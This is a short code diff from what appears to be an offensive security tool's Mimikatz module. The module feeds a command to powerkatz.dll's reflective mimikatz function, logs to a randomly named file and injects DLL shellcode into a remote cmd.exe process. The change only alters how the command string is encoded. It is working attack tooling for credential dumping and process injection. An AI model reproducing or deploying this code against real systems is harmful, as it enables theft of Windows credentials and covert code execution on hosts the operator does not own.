@@ -126,7 +126,7 @@ class Mimikatz(Module):
         dll_name = 'powerkatz.dll'
         exported_function_name = 'powershell_reflective_mimikatz'
         log_file = self._module_settings['env_directory'] + '\\' + random_generator()
-        exported_function_data = str(('"log ' + log_file + '" ' + custom_command + '\x00').encode('utf-16-le'))
+        exported_function_data = '"log ' + log_file + '" ' + custom_command
         if username == '':
             print ('\n\nInjecting converted DLL shellcode into remote process...')
             response = self.inject_dll_srdi_module_object.run([dll_name, 'remote_virtual', 'cmd.exe', '60000', '{}',
